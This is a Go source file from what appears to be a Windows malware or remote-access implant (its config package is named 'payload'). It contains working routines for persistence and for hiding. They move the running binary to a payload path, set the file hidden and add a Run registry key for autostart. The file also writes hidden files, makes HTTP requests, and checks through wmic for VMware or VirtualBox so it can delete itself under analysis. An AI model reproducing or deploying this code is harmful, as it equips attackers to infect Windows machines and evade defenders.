package lib

import (
	"bufio"
	"log"
	"net/http"
	"os"
	"os/exec"
	conf "payload/config"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

type FileInf struct {
	FileName string
	FileData string
}

func Argument(command, cut string, args int) string {
	recv := strings.Split(command, cut)
	for len(recv) == args {
		time.Sleep(3 * time.Second)
		continue
	}
	return recv[args]
}

func hiddenAttribute(path string) {
	utf16file, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		log.Panic(err)
	}
	if conf.HIDE_FILE {
		if err = syscall.SetFileAttributes(utf16file, syscall.FILE_ATTRIBUTE_HIDDEN); err != nil {
			log.Panic(err)
		}
	}
}

func httpReq(method, url string) *http.Response {
	client := &http.Client{}
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		log.Panic(err)
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Panic(err)
	}
	return resp
}

func registryKey(regisPath string) registry.Key {
	key, err := registry.OpenKey(registry.CURRENT_USER, regisPath, registry.SET_VALUE)
	if err != nil {
		log.Panic(err)
	}
	return key
}

func (f *FileInf) Startup() {
	os.Rename(os.Args[0], conf.PAYLOAD_PATH+conf.NNAME)
	hiddenAttribute(conf.PAYLOAD_PATH + conf.NNAME)
	if err := registryKey(conf.HKEY_STARTUP).SetStringValue(f.FileName, conf.PAYLOAD_PATH+conf.NNAME); err != nil {
		log.Fatal(err)
	}
}

func (f *FileInf) createFile() {
	cfile, err := os.Create(f.FileName)
	if err != nil {
		log.Panic(err)
	}
	defer cfile.Close()
	writer := bufio.NewWriter(cfile)
	if _, err = writer.WriteString(f.FileData); err != nil {
		log.Panic(err)
	}
	writer.Flush()
}

func (f *FileInf) OverSizeData() string {
	if len(f.FileData) > 500 {
		f.createFile()
		hiddenAttribute(f.CurrentPath() + "\\" + f.FileName)

		return "Creating file for oversize characters...\n\n" +
			"File Name: " + f.FileName + "\n" +
			"File Path: " + f.CurrentPath() + "\\" + f.FileName +
			"\nHidden Attribute: " + strconv.FormatBool(conf.HIDE_FILE)
	}
	return f.FileData
}

func (f *FileInf) CurrentPath() string {
	path, err := os.Getwd()
	if err != nil {
		log.Panic(err)
	}
	return path
}

func (f *FileInf) RuntimeVM() {
	getWMIC := func(method, info string) string {
		wmic := exec.Command("wmic", method, "get", info)
		wmicOut, err := wmic.CombinedOutput()
		if err != nil {
			log.Panic(err)
		}
		return string(wmicOut)
	}

	/*
		VMware
	*/
	manufacturerVMW := strings.Contains(getWMIC("computersystem", "manufacturer"), "VMware, Inc.")
	modelVMW := strings.Contains(getWMIC("computersystem", "model"), "VMware")
	biosVMW := strings.Contains(getWMIC("bios", "smbiosbiosversion"), "VMW")

	/*
		VirtualBox
	*/
	manufacturerVB := strings.Contains(getWMIC("computersystem", "manufacturer"), "innotek GmbH")
	modelVB := strings.Contains(getWMIC("computersystem", "model"), "VirtualBox")
	biosVB := strings.Contains(getWMIC("bios", "smbiosbiosversion"), "VirtualBox")

	if manufacturerVMW || modelVMW || biosVMW || manufacturerVB || modelVB || biosVB {
		f.SelfRemove()
	}
}
